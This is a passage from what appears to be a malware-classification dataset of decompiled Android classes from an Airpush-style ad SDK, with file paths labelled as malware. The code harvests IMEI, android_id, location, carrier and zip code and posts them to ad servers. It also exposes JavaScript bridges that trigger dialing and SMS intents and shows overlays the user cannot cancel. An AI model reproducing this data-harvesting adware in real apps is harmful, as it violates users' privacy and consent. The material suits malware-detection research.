setLayoutParams(layoutParams);         StringBuilder sb2=new StringBuilder();         sb2.append(""<html><head><style>* {margin:0;padding:0; width: "" + i + ""; height: ""+ i2+ "";}</style></head><body>"").append(this.b.o()).append(""</body></html>"");         loadDataWithBaseURL(null,sb2.toString(),""text/html"",""UTF-8"",null);         return;       }       if (this.b.g().equals(""text"")) {         StringBuilder sb3=new StringBuilder();         sb3.append(""<html><head><style>* {margin:0;}</style></head><body>"");         sb3.append(""<div style='background-color: "" + this.b.i() + ""; width: ""+ i+ ""; height: ""+ i2+ "";'><table><tr>"");         sb3.append(""<td rowspan='2' align='center'><img alt='icon' style='padding: 2' src='"" + this.b.d() + ""'></td>"");         sb3.append(""<td><font color='"" + this.b.h() + ""'><b>""+ this.b.f()+ ""</b><br></font>"");         sb3.append(""</td><tr><td><font size=2 color='"" + this.b.h() + ""'>""+ this.b.e()+ ""</font></td></tr>"");         sb3.append(""</table></div></body></html>"");         loadDataWithBaseURL(null,sb3.toString(),""text/html"",""UTF-8"",null);         return;       }       StringBuilder sb4=new StringBuilder();       sb4.append(""<html><head><style>* {margin:0;padding:0;}</style></head><body>"").append(""<img src=\"""" + this.b.d() + ""\"" height=\""""+ i2+ ""\"" width=\""""+ i+ ""\""/>"").append(""</html></head>"");       loadDataWithBaseURL(null,sb4.toString(),""text/html"",""UTF-8"",null);     }  catch (    Exception e6) {       e6.printStackTrace();       a(""89"");     }   }   @Override public boolean dispatchTouchEvent(  MotionEvent motionEvent){     if (motionEvent.getAction() == 0) {       a(""13"");       if (AdView.b != null) {         AdView.b.e();       }       if (this.b.l() || this.b.n() || this.b.b()|| this.b.c()) {         this.f=true;         return super.dispatchTouchEvent(motionEvent);       }       this.b.a();       return true;     }     return super.dispatchTouchEvent(motionEvent);   }   @Override protected void onAnimationEnd(){     super.onAnimationEnd();     if (this.c != null) {       this.c.a();     }   }   synchronized void a(  final String str){ synchronized (str) {       if (this.d) {         o.a(""Ad in test mode. Sending ignored."");       }  else       if (o.o(getContext())) {         new Thread(new Runnable(){           @Override public void run(){             try {               Log.i(""AirplayMraid"",""Sending banner impression event: "");               if (ImageBanner.this.b.j() || !str.equals(""89"")) {                 String k=ImageBanner.this.b.k();                 if (k.contains(""%event%"")) {                   k=k.replace(""%event%"",str);                 }                 o.a(""URL: "" + k);                 DefaultHttpClient defaultHttpClient=new DefaultHttpClient();                 HttpPost httpPost=new HttpPost(k);                 BasicHttpParams basicHttpParams=new BasicHttpParams();                 httpPost.setParams(basicHttpParams);                 HttpConnectionParams.setConnectionTimeout(basicHttpParams,Constants.HTTP_TIMEOUT);                 HttpConnectionParams.setSoTimeout(basicHttpParams,10000);                 HttpResponse execute=defaultHttpClient.execute(httpPost);                 int statusCode=execute == null ? 0 : execute.getStatusLine().getStatusCode();                 Log.i(""AirplayMraid"",""Status code: "" + statusCode);                 if (statusCode == 200) {                   Log.i(""AirplayMraid"",""Banner Data: "" + EntityUtils.toString(execute.getEntity()));                   return;                 }                 return;               }               o.a(""Error reporting is off."");             }  catch (            Exception e) {               Log.e(""AirplayMraid"",""Exception: "" + e.getMessage());               e.printStackTrace();             }           }         } ,""banner_event"").start();       }     }   }   @Override protected void onMeasure(  int i,  int i2){     super.onMeasure(i,i2);     if (this.b != null) {       String g=this.b.g();       if (g.equals(AdView.BANNER_TYPE_IMAGE) || g.equals(""text"") || g.equals(AdView.BANNER_TYPE_MEDIUM_RECTANGLE)) {         setMeasuredDimension(this.e.getadWidth(),this.e.getadHeight());       }     }   }   void a(){     if (Build.VERSION.SDK_INT >= 8) {       getSettings().setPluginState(WebSettings.PluginState.ON_DEMAND);     }  else {       getSettings().setPluginsEnabled(true);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.lntasllo.pzdcmwai3830\j.code","public class j extends Dialog implements DialogInterface.OnCancelListener, DialogInterface.OnDismissListener {   static final String AD_TYPE_DIALOG_CC=""DCC"";   static final String AD_TYPE_DIALOG_CM=""DCM"";   static final String AD_TYPE_DIALOG_U=""DAU"";   static final String AD_TYPE_OVERLAY=""OLAU"";   private static String n;   private static String p;   Activity a;   View.OnTouchListener b;   private final String c;   private final String d;   private final String e;   private final String f;   private final String g;   private final String h;   private final String i;   private final String j;   private final String k;   private WebView q;   private boolean s;   private boolean t;   private static int l=250;   private static int m=AdException.INVALID_REQUEST;   private static boolean o=false;   private static String r="""";   public j(  Activity activity){     super(activity);     this.c=""AirplaySDK"";     this.d=""23"";     this.e=""24"";     this.f=""25"";     this.g=""43"";     this.h=""44"";     this.i=""45"";     this.j=""184"";     this.k=""183"";     this.s=false;     this.t=false;     this.b=new View.OnTouchListener(){       @Override public boolean onTouch(      View view,      MotionEvent motionEvent){         if (view == j.this.q && motionEvent.getAction() == 0) {           j.this.t=true;           return false;         }         return false;       }     } ;     try {       this.a=activity;       requestWindowFeature(1);       getWindow().setBackgroundDrawable(new ColorDrawable(0));       setCancelable(false);       setCanceledOnTouchOutside(false);       setOnCancelListener(this);       setOnDismissListener(this);       float f=activity.getResources().getDisplayMetrics().density;       RelativeLayout relativeLayout=new RelativeLayout(activity);       relativeLayout.setId(76);       RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(-2,-2);       layoutParams.addRule(13);       relativeLayout.setLayoutParams(layoutParams);       this.q=new WebView(activity);       this.q.setId(54);       this.q.getSettings().setJavaScriptEnabled(true);       this.q.setWebChromeClient(new WebChromeClient());       this.q.setHorizontalScrollBarEnabled(false);       this.q.setVerticalScrollBarEnabled(false);       this.q.getSettings().setCacheMode(-1);       this.q.setBackgroundColor(0);       this.q.setScrollBarStyle(33554432);       this.q.addJavascriptInterface(new a(),""Overlay"");       this.q.setOnTouchListener(this.b);       this.q.setWebViewClient(new WebViewClient(){         @Override public void onLoadResource(        WebView webView,        String str){           if (j.this.t && j.this.isShowing()) {             j.this.b(str);           }  else {             super.onLoadResource(webView,str);           }         }         @Override public void onPageFinished(        WebView webView,        String str){           super.onPageFinished(webView,str);           try {             if (j.this.s) {               Log.i(""AirplaySDK"",""Error in loading"");               j.this.dismiss();               if (j.r.equals(j.AD_TYPE_DIALOG_U) || j.r.equals(j.AD_TYPE_DIALOG_CC) || j.r.equals(j.AD_TYPE_DIALOG_CM)) {                 j.this.a(""184"");                 return;               }  else {                 j.this.a(""183"");                 return;               }             }             j.this.show();             if (j.r.equals(j.AD_TYPE_DIALOG_U) || j.r.equals(j.AD_TYPE_DIALOG_CC) || j.r.equals(j.AD_TYPE_DIALOG_CM)) {               j.this.a(""43"");             }  else {               j.this.a(""23"");             }             if (b.a != null) {               b.a.a();             }           }  catch (          Exception e) {             e.printStackTrace();             j.this.a.finish();           }         }         @Override public void onReceivedError(        WebView webView,        int i,        String str,        String str2){           j.this.s=true;           try {             j.this.dismiss();             j.this.a.finish();           }  catch (          Throwable th) {             Log.e(""AirplaySDK"",""Error occurred while loading Overlay Ad: code "" + i + "", desc: ""+ str);           }           super.onReceivedError(webView,i,str,str2);         }         @Override public boolean shouldOverrideUrlLoading(        WebView webView,        String str){           try {           }  catch (          Exception e) {             e.printStackTrace();             j.this.dismiss();             j.this.a.finish();           }           if (j.this.t) {             j.this.b(str);             return true;           }           webView.loadUrl(str);           return true;         }       } );       this.q.loadDataWithBaseURL(null,n,""text/html"",""UTF-8"",null);       RelativeLayout.LayoutParams layoutParams2=new RelativeLayout.LayoutParams(m,l);       layoutParams2.addRule(13);       this.q.setLayoutParams(layoutParams2);       relativeLayout.addView(this.q);       setContentView(relativeLayout);     }  catch (    Exception e) {       Log.e(""AirplaySDK"",""An error occured while starting Overlay Ad."");       try {         dismiss();         activity.finish();       }  catch (      Exception e2) {       }     }   }   public void b(  String str){     try {       try {         dismiss();         try {           Intent intent=new Intent(""android.intent.action.VIEW"",Uri.parse(str));           intent.setFlags(268435456);           intent.addFlags(8388608);           intent.addCategory(""android.intent.category.LAUNCHER"");           intent.setClassName(""com.android.browser"",""com.android.browser.BrowserActivity"");           this.a.startActivity(intent);           if (r.equals(AD_TYPE_DIALOG_U) || r.equals(AD_TYPE_DIALOG_CC) || r.equals(AD_TYPE_DIALOG_CM)) {             a(""44"");           }  else {             a(""24"");           }         }  catch (        ActivityNotFoundException e) {           Log.i(""AirplaySDK"",""Browser not found."");           Intent intent2=new Intent(""android.intent.action.VIEW"",Uri.parse(str));           intent2.setFlags(268435456);           intent2.addFlags(8388608);           this.a.startActivity(intent2);           if (r.equals(AD_TYPE_DIALOG_U) || r.equals(AD_TYPE_DIALOG_CC) || r.equals(AD_TYPE_DIALOG_CM)) {             a(""44"");           }  else {             a(""24"");           }           this.a.finish();         }       }  catch (      Exception e2) {         e2.printStackTrace();         this.a.finish();       }     }  catch (    ActivityNotFoundException e3) {       Log.e(""AirplaySDK"",""Error whlie displaying dialog ad......: "" + e3.getMessage());       this.a.finish();     }   } private class a {     private a(){     }     @JavascriptInterface public void close(){       j.this.dismiss();       if (j.r.equals(j.AD_TYPE_DIALOG_U) || j.r.equals(j.AD_TYPE_DIALOG_CC) || j.r.equals(j.AD_TYPE_DIALOG_CM)) {         j.this.a(""45"");       }  else {         j.this.a(""25"");       }       j.this.a.finish();     }     @JavascriptInterface public void open(    String str){       j.this.b(str);       j.this.a.finish();     }     @JavascriptInterface public void call(    String str){       try {         j.this.dismiss();         Intent intent=new Intent(""android.intent.action.DIAL"",Uri.parse(""tel:"" + str));         intent.addFlags(268435456);         j.this.a.startActivity(intent);         if (j.r.equals(j.AD_TYPE_DIALOG_U) || j.r.equals(j.AD_TYPE_DIALOG_CC) || j.r.equals(j.AD_TYPE_DIALOG_CM)) {           j.this.a(""44"");         }  else {           j.this.a(""24"");         }       }  catch (      ActivityNotFoundException e) {         e.printStackTrace();       } catch (      Exception e2) {       }       j.this.a.finish();     }     @JavascriptInterface public void sms(    String str,    String str2){       try {         j.this.dismiss();         Intent intent=new Intent(""android.intent.action.VIEW"");         intent.addFlags(268435456);         intent.setType(""vnd.android-dir/mms-sms"");         intent.putExtra(""address"",str);         intent.putExtra(""sms_body"",str2);         j.this.a.startActivity(intent);         if (j.r.equals(j.AD_TYPE_DIALOG_U) || j.r.equals(j.AD_TYPE_DIALOG_CC) || j.r.equals(j.AD_TYPE_DIALOG_CM)) {           j.this.a(""44"");         }  else {           j.this.a(""24"");         }       }  catch (      Exception e) {         j.this.a.finish();         e.printStackTrace();       }     }   }   @Override public void onCancel(  DialogInterface dialogInterface){     if (dialogInterface != null) {       try {         dialogInterface.dismiss();       }  catch (      Exception e) {         return;       }     }     this.a.finish();   }   @Override public void onDismiss(  DialogInterface dialogInterface){     if (this != null) {       try {         if (this.q != null) {           this.q.stopLoading();           this.q.removeAllViews();           this.q.destroy();         }         dismiss();       }  catch (      Exception e) {       } catch (      Throwable th) {       }     }     try {       this.a.finish();     }  catch (    Exception e2) {       this.a.finish();     }   }   final void a(  final String str){ synchronized (str) {       if (o.o(getContext())) {         new Thread(new Runnable(){           @Override public void run(){             try {               Log.i(""AirplaySDK"",""Sending overlay event: "");               if (j.o || (!str.equals(""184"") && !str.equals(""183""))) {                 String str2=j.p;                 if (j.p.contains(""%event%"")) {                   str2=str2.replace(""%event%"",str);                 }                 o.a(""URL: "" + str2);                 DefaultHttpClient defaultHttpClient=new DefaultHttpClient();                 HttpPost httpPost=new HttpPost(str2);                 BasicHttpParams basicHttpParams=new BasicHttpParams();                 httpPost.setParams(basicHttpParams);                 HttpConnectionParams.setConnectionTimeout(basicHttpParams,Constants.HTTP_TIMEOUT);                 HttpConnectionParams.setSoTimeout(basicHttpParams,10000);                 HttpResponse execute=defaultHttpClient.execute(httpPost);                 int statusCode=execute == null ? 0 : execute.getStatusLine().getStatusCode();                 Log.i(""AirplaySDK"",""Status code: "" + statusCode);                 if (statusCode == 200) {                   Log.i(""AirplaySDK"",""Overlay Data: "" + EntityUtils.toString(execute.getEntity()));                   return;                 }                 return;               }               o.a(""Error reporting is off."");             }  catch (            Exception e) {               Log.e(""AirplaySDK"",""Exception in overlay: "",e);             }           }         } ,""overlay_event"").start();       }     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.lntasllo.pzdcmwai3830\k.code","public abstract class k {   private static final String TAG=""AirplaySDK"";   private static boolean a=false;   public static boolean a(  Context context){     String str;     try {       try {         Bundle bundle=context.getPackageManager().getApplicationInfo(context.getPackageName(),android.support.v4.view.a.a.ACTION_CLEAR_ACCESSIBILITY_FOCUS).metaData;         String obj=bundle.get(""com.lntasllo.pzdcmwai3830.APPID"").toString();         if (obj != null && !obj.equals("""") && !obj.equals(""0"")) {           o.f(obj);         }         String str2="""";         try {           str=bundle.get(""com.lntasllo.pzdcmwai3830.APIKEY"").toString();         }  catch (        Exception e) {           e=e;         }         if (str != null) {           try {           }  catch (          Exception e2) {             str2=str;             e=e2;             Log.e(TAG,""Problem with fetching apiKey. Please chcek your APIKEY declaration in Manifest. It should be same as given in SDK doc."",e);             new l(context,101);             o.e(""airplay"");             a(""Please check your APIKEY declaration in Manifest. It must be same as given in doc."");             str=str2;             o.a(""AppId: "" + obj + "" ApiKey=""+ str);             return true;           }           if (!str.equals("""") && !str.equals(""0"")) {             StringTokenizer stringTokenizer=new StringTokenizer(str,""*"");             stringTokenizer.nextToken();             str=stringTokenizer.nextToken();             o.e(str);             o.a(""AppId: "" + obj + "" ApiKey=""+ str);             return true;           }         }         o.e(""airplay"");         o.a(""AppId: "" + obj + "" ApiKey=""+ str);         return true;       }  catch (      PackageManager.NameNotFoundException e3) {         Log.e(TAG,""AppId or ApiKey not found in Manifest. Please add."",e3);         a(""AppId or ApiKey not found in Manifest. Please add."");         return false;       }     }  catch (    Exception e4) {       Log.e(TAG,""Please check your SDK declarations in Manifest. This errors comes when SDK unable to fetch APPID or APIKEY from Manifest. SDK Package Name: "",e4);       a(""Please check your SDK declarations in Manifest. This error comes when SDK unable to fetch APPID or APIKEY from Manifest."");       return false;     }   }   public static boolean b(  Context context){     boolean z;     boolean z2=false;     boolean z3=context.checkCallingOrSelfPermission(""android.permission.INTERNET"") == 0;     boolean z4=context.checkCallingOrSelfPermission(""android.permission.ACCESS_NETWORK_STATE"") == 0;     boolean z5=context.checkCallingOrSelfPermission(""android.permission.READ_PHONE_STATE"") == 0;     if (z3) {       z=true;     }  else {       Log.e(TAG,""Required INTERNET permission not found in manifest."");       a(""Required INTERNET permission not found in manifest."");       z=false;     }     if (!z4) {       Log.e(TAG,""Required ACCESS_NETWORK_STATE permission not found in manifest."");       a(""Required ACCESS_NETWORK_STATE permission not found in manifest."");       z=false;     }     if (z5) {       z2=z;     }  else {       Log.e(TAG,""Required READ_PHONE_STATE permission not found in manifest."");       a(""Required READ_PHONE_STATE permission not found in manifest."");     }     if (!z2 && !a) {       new l(context,100);       a=true;     }     return z2;   }   public static void a(  final String str){     try {       if (b.a != null) {         b.c.post(new Runnable(){           @Override public void run(){             b.a.b(str);           }         } );       }     }  catch (    Exception e) {       try {         b.a.b(str);       }  catch (      Exception e2) {       }     }   }   public static void b(  final String str){     try {       if (b.a != null) {         b.c.post(new Runnable(){           @Override public void run(){             b.a.a(str);           }         } );       }     }  catch (    Exception e) {       try {         b.a.a(str);       }  catch (      Exception e2) {       }     }   }   public static void a(  final a.EnumC0031a enumC0031a){     try {       if (b.a != null) {         b.c.post(new Runnable(){           @Override public void run(){             b.a.a(a.EnumC0031a.this);           }         } );       }     }  catch (    Exception e) {       try {         b.a.a(enumC0031a);       }  catch (      Exception e2) {       }     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.lntasllo.pzdcmwai3830\l.code","public class l {   static final int BANNER_AD_BROWSER_ACTIVTY_NOT_FOUND=109;   static final int INVALID_APIKEY=101;   static final int REQUIRED_PERMISSIONS_NOT_FOUND=100;   static final int REQUIRED_VIDEO_AD_PERMISSIONS_NOT_FOUND=110;   static final int SMARTWALL_ACTIVITY_NOT_FOUND=103;   static final int SMARTWALL_BROWSER_ACTITY_NOT_FOUND=104;   static final int VIDEO_AD_ACTIVITY_NOT_FOUND=102;   private Context a;   public l(  Context context,  int i){     if (context != null) {       this.a=context;       if (o.o(context)) {         a(i);       }     }   }   private void a(  final int i){ synchronized (this) {       try {       }  catch (      Exception e) {         Log.e(""AirplaySDK"",""Sending integration error failed."",e);       }       if (o.f() == null || o.f().equals(""0"")) {         Log.i(""AirplaySDK"",""Appid is invalid. Sending report aborted."");       }  else {         new Thread(new Runnable(){           @Override public void run(){             try {               PackageInfo packageInfo=l.this.a.getPackageManager().getPackageInfo(l.this.a.getPackageName(),0);               String str="""" + packageInfo.versionCode;               ArrayList arrayList=new ArrayList();               arrayList.add(new BasicNameValuePair(""appVersion"",str));               arrayList.add(new BasicNameValuePair(AdTrackerConstants.APP_ID,o.f()));               arrayList.add(new BasicNameValuePair(""errorCode"","""" + i));               arrayList.add(new BasicNameValuePair(""packageName"",l.this.a.getPackageName()));               arrayList.add(new BasicNameValuePair(""appName"",l.this.a.getPackageManager().getApplicationLabel(packageInfo.applicationInfo).toString()));               Log.i(""AirplaySDK"",""Error values: "" + arrayList);               DefaultHttpClient defaultHttpClient=new DefaultHttpClient();               HttpPost httpPost=new HttpPost(""https://api.airpush.com/integrationerror/error.php"");               httpPost.setEntity(new UrlEncodedFormEntity(arrayList));               BasicHttpParams basicHttpParams=new BasicHttpParams();               httpPost.setParams(basicHttpParams);               HttpConnectionParams.setConnectionTimeout(basicHttpParams,7000);               HttpConnectionParams.setSoTimeout(basicHttpParams,7000);               HttpResponse execute=defaultHttpClient.execute(httpPost);               int statusCode=execute != null ? execute.getStatusLine().getStatusCode() : 0;               Log.i(""AirplaySDK"",""Status code: "" + statusCode);               if (statusCode == 200) {                 Log.i(""AirplaySDK"",""Error sent: "" + EntityUtils.toString(execute.getEntity()));               }  else {                 Log.i(""AirplaySDK"",""Status Code: "" + statusCode + "", Reason: ""+ execute.getStatusLine().getReasonPhrase());               }             }  catch (            PackageManager.NameNotFoundException e2) {               e2.printStackTrace();             } catch (            UnsupportedEncodingException e3) {               e3.printStackTrace();             } catch (            ClientProtocolException e4) {               e4.printStackTrace();             } catch (            IOException e5) {               e5.printStackTrace();             } catch (            Exception e6) {               e6.printStackTrace();             }           }         } ).start();       }     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.lntasllo.pzdcmwai3830\m.code","class m {   static List<NameValuePair> b;   private static Context c;   private static SharedPreferences e;   static JSONObject a=null;   private static String d=""0"";   public m(  Context context){     c=context;   }   public void a(){     try {       o.g(new WebView(c).getSettings().getUserAgentString());       n nVar=new n(c);       try {         Location c2=nVar.c();         if (c2 != null) {           String str="""" + c2.getLatitude();           String str2="""" + c2.getLongitude();           o.a(""Location: lat "" + str + "", lon ""+ str2);           o.h(str);           o.i(str2);         }  else {           o.a(""Location null: "");         }       }  catch (      Exception e2) {       }       d=nVar.a() + """" + o.f()+ """"+ o.k();       MessageDigest messageDigest=MessageDigest.getInstance(""MD5"");       messageDigest.update(d.getBytes(),0,d.length());       d=new BigInteger(1,messageDigest.digest()).toString(16);     }  catch (    Exception e3) {       o.a(""Token conversion Error "");     }   }   public static List<NameValuePair> a(  Context context) throws NullPointerException, Exception {     c=context;     b=new ArrayList();     b.add(new BasicNameValuePair(""APIKEY"",o.e()));     b.add(new BasicNameValuePair(AdTrackerConstants.APP_ID,o.f()));     b.add(new BasicNameValuePair(""imei"",o.c()));     b.add(new BasicNameValuePair(""imei_sha"",o.d()));     b.add(new BasicNameValuePair(""token"",d));     b.add(new BasicNameValuePair(""request_timestamp"",o.k()));     b.add(new BasicNameValuePair(""packageName"",o.e(c)));     b.add(new BasicNameValuePair(""version"",o.m()));     b.add(new BasicNameValuePair(""carrier"",o.f(c)));     b.add(new BasicNameValuePair(""networkOperator"",o.g(c)));     b.add(new BasicNameValuePair(""phoneModel"",o.l()));     b.add(new BasicNameValuePair(""manufacturer"",o.n()));     b.add(new BasicNameValuePair(""longitude"",o.i()));     b.add(new BasicNameValuePair(""latitude"",o.h()));     b.add(new BasicNameValuePair(""sdkversion"",o.a()));     b.add(new BasicNameValuePair(""wifi"","""" + o.h(c)));     b.add(new BasicNameValuePair(""useragent"",o.g()));     b.add(new BasicNameValuePair(""android_id"",o.c(c)));     b.add(new BasicNameValuePair(""android_id_sha"",o.d(c)));     b.add(new BasicNameValuePair(""screenSize"",o.k(c)));     b.add(new BasicNameValuePair(""deviceUniqueness"",o.o()));     b.add(new BasicNameValuePair(""networkSubType"",o.i(c)));     b.add(new BasicNameValuePair(""isTablet"",String.valueOf(o.b(c))));     b.add(new BasicNameValuePair(""SD"",o.m(c)));     b.add(new BasicNameValuePair(""isConnectionFast"","""" + o.j(c)));     b.add(new BasicNameValuePair(""unknownsource"","""" + o.q(c)));     b.add(new BasicNameValuePair(""appName"",o.p(c)));     b.add(new BasicNameValuePair(""dpi"",o.n(c)));     b.add(new BasicNameValuePair(AdTrackerConstants.SOURCE,AnalyticsEvent.IN_APP));     b.add(new BasicNameValuePair(""sessionId"",o.b()));     b.add(new BasicNameValuePair(""language"","""" + o.p()));     b.add(new BasicNameValuePair(""locale"","""" + Locale.getDefault()));     try {       String[] l=o.l(c);       b.add(new BasicNameValuePair(""country"","""" + l[0]));       b.add(new BasicNameValuePair(""zip"","""" + l[1]));     }  catch (    NullPointerException e2) {     } catch (    Exception e3) {     }     return b;   }   public static boolean b(  Context context){     try {       e=null;       e=context.getSharedPreferences(""video_ad_call"",0);       SharedPreferences.Editor edit=e.edit();       long currentTimeMillis=30000 + System.currentTimeMillis();       edit.putLong(""startTime"",currentTimeMillis);       o.a(""Next Video ad ad call time: "" + new Date(currentTimeMillis).toString());       return edit.commit();     }  catch (    Exception e2) {       return false;     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.lntasllo.pzdcmwai3830\MraidView.code","public final class MraidView extends WebView {   static MraidView a;   boolean b;   private AdView c;   private a.b d;   private Handler e;   private String f;   private DisplayMetrics g;   private int h;   private int i;   private int j;   private int k;   private c l;   private String m;   private boolean n;   private float o;   private FrameLayout p;   private ViewGroup q;   private int r;   private VideoView s;   private e t;   private String u;   private boolean v;   private f.b w;   private AdView.a x;   public MraidView(  Context context,  f.b bVar,  Handler handler){     super(context);     this.b=false;     try {       try {         if (Build.VERSION.SDK_INT >= 11 && (context instanceof Activity)) {           ((Activity)context).getWindow().setFlags(16777216,16777216);         }       }  catch (      Exception e2) {         e2.printStackTrace();         return;       }     }  catch (    Throwable th) {     }     this.u=bVar.d();     this.e=handler;     this.t=new e();     this.g=context.getResources().getDisplayMetrics();     this.o=this.g.density;     this.l=new c();     this.w=bVar;     j();   }   public MraidView(  Context context,  AdView adView,  a.b bVar,  Handler handler,  AdView.a aVar){     super(context);     this.b=false;     try {       if (Build.VERSION.SDK_INT >= 11 && (getContext() instanceof Activity)) {         ((Activity)getContext()).getWindow().setFlags(16777216,16777216);       }     }  catch (    Throwable th) {     }     this.x=aVar;     a=this;     this.w=adView.d;     this.c=adView;     this.d=bVar;     this.e=handler;     this.u=this.w.d();     this.b=adView.a();     this.t=new e();     this.f=adView.getPlacementType();     this.g=context.getResources().getDisplayMetrics();     this.o=this.g.density;     if (this.f.equals(AdView.PLACEMENT_TYPE_INLINE)) {       this.h=this.g.widthPixels;       if (o.b(getContext())) {         this.i=90;       }  else {         this.i=60;       }     }  else {       this.h=this.g.widthPixels;       this.i=this.g.heightPixels;     }     try {       this.j=(int)o.b(this.h,getContext());       this.k=(int)o.b(this.i,getContext());     }  catch (    Exception e2) {       e2.printStackTrace();     }     o.a(""Device Width:"" + this.h + "", Device Height:""+ this.i);     this.l=new c();     j();     this.l.a();     setLayoutParams(new FrameLayout.LayoutParams(-1,o.b(getContext()) ? (int)(90.0f * this.o) : (int)(60.0f * this.o)));   }   private void j(){     setLayoutParams(new ViewGroup.LayoutParams(this.h,this.i));     setHorizontalScrollBarEnabled(false);     setVerticalScrollBarEnabled(false);     setScrollBarStyle(33554432);     setBackgroundColor(0);     setWebChromeClient(new b());     WebSettings settings=getSettings();     settings.setRenderPriority(WebSettings.RenderPriority.HIGH);     settings.setLayoutAlgorithm(WebSettings.LayoutAlgorithm.NARROW_COLUMNS);     settings.setCacheMode(2);     settings.setLoadWithOverviewMode(true);     settings.setLoadsImagesAutomatically(true);     settings.setUseWideViewPort(false);     settings.setJavaScriptEnabled(true);     addJavascriptInterface(new d(),""airpush_mraid"");     if (Build.VERSION.SDK_INT >= 8) {       settings.setPluginState(WebSettings.PluginState.ON);     }  else {       settings.setPluginsEnabled(true);     }     setWebViewClient(new a());     a(this.u);     if (this.d != null) {       this.d.a();     }   }   void a(  String str){     f(o.r(getContext()));     if (str != null && str.endsWith("".js"")) {       int lastIndexOf=str.lastIndexOf(""/"");       loadDataWithBaseURL(str.substring(0,lastIndexOf - 1),""<html><head><script type=\""text/javascript\"" src=\"""" + str.substring(lastIndexOf,str.length() - 1) + ""\""/></head><body></body></html>"",""text/html"",""utf-8"",null);       return;     }     if (this.w.e()) {       if (this.w.a() != null && !this.w.a().equals("""")) {         loadDataWithBaseURL(null,this.w.a(),""text/html"",""utf-8"",null);         return;       }  else {         Log.e(""AirplayMraid"",""Tag data is null"");         return;       }     }     if (this.w.c()) {       if (this.w.a() != null && !this.w.a().equals("""")) {         loadDataWithBaseURL(null,""<html><head><script type=\""text/javascript\"" src=\"""" + this.w.a() + ""\""/></head><body></body></html>"",""text/html"",""utf-8"",null);         return;       }  else {         Log.e(""AirplayMraid"",""Tag data is null"");         return;       }     }     if (this.w.b()) {       if (this.w.a() != null && !this.w.a().equals("""")) {         loadDataWithBaseURL(null,""<html><head></head><body>"" + this.w.a() + ""</body></html>"",""text/html"",""utf-8"",null);         return;       }  else {         Log.e(""AirplayMraid"",""tag data is null"");         return;       }     }     if (str != null && !str.equals("""")) {       loadUrl(str);     }  else {       Log.e(""AirplayMraid"",""Invalid url: "" + str);     }   }   void a(){     f(""mraid.setPlacementType('"" + this.f + ""')"");     o.a(""SDK LOG: display Ad called."");     f(""mraid.setExpandProperties("" + this.l.a() + "");"");     k();     setState(""default"");     e(""ready"");     if (this.e != null) {       this.e.sendEmptyMessage(0);       onAnimationEnd();     }     e();     Log.i(""AirplayMraid"",""Sending impression data:>"");     g(""90"");   }   private void k(){     boolean z;     if (this.n && getVisibility() == 0) {       z=true;     }  else {       z=false;     }     if (z != this.v && this.m == ""default"") {       this.v=z;       setViewable(this.v);     }   }   @Override protected void onAttachedToWindow(){     super.onAttachedToWindow();     this.n=true;     k();   }   @Override protected void onDetachedFromWindow(){     super.onDetachedFromWindow();     this.n=false;     k();   }   @Override public void setVisibility(  int i){     super.setVisibility(i);     k();   }   @Override public void loadUrl(  String str){     o.a(""Loading url: "" + str);     super.loadUrl(str);   }   @Override public void loadDataWithBaseURL(  String str,  String str2,  String str3,  String str4,  String str5){     super.loadDataWithBaseURL(str,str2,str3,str4,str5);     if (this.d != null) {       this.d.a();     }   }   public void l(){     g();     f();     i();     d();   }   @Override protected void onAnimationEnd(){     super.onAnimationEnd();     if (this.x != null) {       o.a(""Animation end."");       this.x.a();     }   }   public void b(  String str){     try {       clearView();       FrameLayout frameLayout=(FrameLayout)getRootView().findViewById(R.id.content);       FrameLayout.LayoutParams layoutParams=new FrameLayout.LayoutParams(-1,-1);       View view=new View(getContext());       view.setLayoutParams(getLayoutParams());       this.p=new FrameLayout(getContext());       FrameLayout.LayoutParams layoutParams2=new FrameLayout.LayoutParams(-1,-1);       layoutParams2.gravity=17;       this.p.setLayoutParams(layoutParams2);       this.q=(ViewGroup)getParent();       if (this.q != null) {         int childCount=this.q.getChildCount();         int i=0;         while (i < childCount && this.q.getChildAt(i) != this) {           i++;         }         this.r=i;         setLayoutParams(layoutParams);         this.q.removeView(this);         this.p.addView(this);         if (!this.l.a) {           Button a2=a(5);           a2.setId(111);           FrameLayout.LayoutParams layoutParams3=new FrameLayout.LayoutParams(((int)this.o) * 50,((int)this.o) * 50);           layoutParams3.gravity=53;           a2.setLayoutParams(layoutParams3);           this.p.addView(a2);         }         frameLayout.addView(this.p);         this.q.addView(view,this.r);         this.q.setVisibility(8);         setState(""expanded"");         if (str != null && !str.equals("""")) {           loadUrl(str);         }       }       if (this.d != null) {         this.d.d();       }       if (this.c != null) {         this.c.c=false;       }       g(""94"");     }  catch (    Exception e2) {       g(""89"");       e2.printStackTrace();     }   }   public void b(){     int i;     int i2;     int i3;     boolean z;     int i4;     int i5;     int i6;     int i7;     int a2;     int a3;     int i8=this.g.widthPixels;     int i9=this.g.heightPixels;     try {       clearView();       if (this.t == null || this.t.a().equals("""")) {         i=0;         i2=0;         i3=i9;         z=true;         i4=i8;         i5=53;       }  else {         try {           JSONObject jSONObject=new JSONObject(this.t.a());           if (jSONObject.isNull(""width"")) {             a2=this.g.widthPixels;           }  else {             a2=(int)o.a(jSONObject.getInt(""width""),getContext());           }           if (jSONObject.isNull(""height"")) {             a3=this.g.heightPixels;           }  else {             a3=(int)o.a(jSONObject.getInt(""height""),getContext());           }           String string=jSONObject.isNull(""customClosePosition"") ? ""top-right"" : jSONObject.getString(""customClosePosition"");           int i10=jSONObject.isNull(""offsetX"") ? 0 : jSONObject.getInt(""offsetX"");           int i11=jSONObject.isNull(""offsetY"") ? 0 : jSONObject.getInt(""offsetY"");           boolean z2=jSONObject.isNull(""allowOffscreen"") ? true : jSONObject.getBoolean(""allowOffscreen"");           int c2=this.t.c(string);           i3=a3;           i=i11;           z=z2;           